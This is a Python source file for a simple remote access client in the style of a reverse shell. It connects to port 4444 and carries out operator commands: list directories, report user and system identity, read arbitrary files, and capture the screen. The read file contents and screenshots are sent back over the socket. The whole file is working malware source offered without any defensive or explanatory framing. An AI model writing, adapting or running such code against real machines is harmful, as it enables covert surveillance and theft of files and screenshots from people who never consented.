import socket
import os
from time import sleep


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host = socket.gethostname()
port = 4444
s.connect((host,port))

def main():

    while True:
        cmd = s.recv(50000000)
        cmd = cmd.decode()

        if cmd == "pwd":
            data = os.getcwd()
            data = str(data)
            s.send(data.encode())

        elif cmd == "ls":

            path = s.recv(5000)
            path = path.decode()

            data = os.listdir(path)
            data = str(data)
            s.send(data.encode())

        elif cmd == "id":

            data = os.getuid()
            data = str(data)
            s.send(data.encode())

        elif cmd == "uname":
            data = os.uname()
            data = str(data)
            s.send(data.encode())

        elif cmd == "cat":
            f = s.recv(5000)
            f = f.decode()
            file = open(f,'rb')
            data = file.read()
            data = str(data)
            s.send(data.encode()) 
        
        elif cmd == "screenshot":
            import pyscreenshot as ImageGrab
            im = ImageGrab.grab()
            im.save("fullscreen.jpg")

            img = open("fullscreen.jpg","rb")
            img_data = img.read(5000000)
            i = True
            while i:
                s.send(img_data)
                img_data = img.read(5000000)
                i = False
            img.close()
        else:
            pass

if __name__ == "__main__":
    main()
